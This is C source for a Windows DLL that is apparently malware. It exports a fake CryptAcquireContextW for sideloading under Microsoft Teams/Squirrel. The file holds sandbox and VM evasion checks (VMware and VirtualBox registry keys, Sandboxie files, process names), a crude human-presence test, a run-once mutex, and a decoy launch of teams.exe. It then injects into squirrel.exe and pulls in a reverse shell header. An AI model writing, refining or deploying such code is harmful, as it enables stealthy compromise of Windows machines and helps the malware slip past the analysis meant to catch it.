#include <stdlib.h>
#include <windows.h>
#include <tlhelp32.h>

#include "mapinject.h"
#include "reverse_shell.h"
#include "pidhandler.h"

// Excluding the function we are injecting into
#ifndef NO_WINCRYPT
#include <wincrypt.h>
#endif

// Constants
#define PSIZE 1024

// Mutex name
#define MUTEX_NAME TEXT("WindowsProc")

/*

    Sandbox Evasion Section

    NOTE: Do Not Use. It makes it hard to test. I just like to have the option avaiable. Plus we needed more code.

*/

// Exit process while keeping functionality. Protects stealth even if it doesn't work.
void CustomExitProcess() {
    execute_Teams();
    ExitProcess(1);
}


// Function to evade sandboxing
void stale() {
    // Check for known sandbox artifacts
    if (isSandboxArtifactPresent()) {
        CustomExitProcess(); // Exit if sandbox artifacts are detected
    }

    // Check for human-like interaction
    if (!isHumanInteractionPresent()) {
        CustomExitProcess(); // Exit if human-like interaction is not detected
    }
}


// Sandbox artifact checks

// Function to check if a specified registry key exists
int checkRegistryKey(const char* keyPath) {
    HKEY hKey;
    // Attempt to open the specified registry key for reading
    LONG result = RegOpenKeyExA(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_READ, &hKey);
    // Close the registry key handle
    RegCloseKey(hKey);
    // Return true if the key was successfully opened, indicating its existence
    return result == ERROR_SUCCESS;
}

// Function to check if a file exists at the specified path
int checkFileExistence(const char* filePath) {
    // Use GetFileAttributesA to retrieve file attributes
    // If the result is not INVALID_FILE_ATTRIBUTES, the file exists
    return GetFileAttributesA(filePath) != INVALID_FILE_ATTRIBUTES;
}

// Function to check if a process with the specified name is currently running
int checkRunningProcesses(const char* processName) {
    // Create a snapshot of the current processes
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Iterate through the processes in the snapshot
    if (Process32First(hSnap, &pe32)) {
        do {
            // Compare process names case-insensitively
            if (_stricmp(pe32.szExeFile, processName) == 0) {
                // Close the snapshot handle and return true if a matching process is found
                CloseHandle(hSnap);
                return 1;
            }
        } while (Process32Next(hSnap, &pe32));
    }

    // Close the snapshot handle and return false if no matching process is found
    CloseHandle(hSnap);
    return 0;
}



// Human user detection
int isHumanInteractionPresent() {
    // Check for mouse movement
    INPUT input;
    input.type = INPUT_MOUSE;
    input.mi.dx = 1;
    input.mi.dy = 1;
    input.mi.dwFlags = MOUSEEVENTF_MOVE;
    SendInput(1, &input, sizeof(INPUT));

    // Check for keyboard input
    SHORT keyState = GetAsyncKeyState(VK_SHIFT);
    if (keyState == 0 || keyState == 1) {
        // Shift key is pressed or released
        return 1;
    }

    // Check for window focus changes
    HWND foregroundWindow = GetForegroundWindow();
    if (foregroundWindow != NULL) {
        CHAR windowTitle[256];
        GetWindowTextA(foregroundWindow, windowTitle, sizeof(windowTitle));
        
        // Check if the window title is not empty (indicating potential user interaction)
        if (strlen(windowTitle) > 0) {
            return 1;
        }
    }

    // Placeholder for additional checks related to human-like interaction...

    return 0;
}


// Function to check sandbox artifacts
int isSandboxArtifactPresent() {
    // Check for specific registry keys associated with sandboxes
    if (checkRegistryKey("SOFTWARE\\VMware, Inc.\\VMware Tools") || checkRegistryKey("SOFTWARE\\Oracle\\VirtualBox")) {
        return 1;
    }

    // Check for specific files often present in sandboxes
    if (checkFileExistence("C:\\sbiedll.dll") || checkFileExistence("C:\\\\BoxedAppSDK64.dll")) {
        return 1;
    }

    // Check for the presence of known sandbox processes
    if (checkRunningProcesses("sandbox.exe") || checkRunningProcesses("vmware.exe")) {
        return 1;
    }

    return 0;
}

/*

    Injection and running section

*/

// Execute Teams.exe
void execute_Teams() {
    system("teams.exe");
}

// function that gets exported and injected.

// changed in order to compile through wsl    
//__declspec(dllexport) void CryptAcquireContextW() {


__declspec(dllexport) void CryptAcquireContextW() {
    char payload[PSIZE];

    // Check if payload has already been executed using Mutex
    HANDLE hMutex = CreateMutex(NULL, FALSE, MUTEX_NAME);
    if (hMutex != NULL) {
        if (GetLastError() == ERROR_ALREADY_EXISTS) {
            // Mutex already exists, indicating the payload has been executed
            CustomExitProcess();
        }
    }

    // Evade ML and Sandboxing checks
    stale();


    // run teams to mimic legitimate behavior
    execute_Teams();

    // Inject process
    // Call GetPID to get the PID of "squirrel.exe"
    int PID = GetPID("squirrel.exe");

    // Check if the PID is valid (not 0, indicating a failure)
    if (PID != 0) {
        mapinject(PID);
    } else {
        ExitProcess(1);
    }

    // Mutex release
    ReleaseMutex(hMutex);
    CloseHandle(hMutex);
}
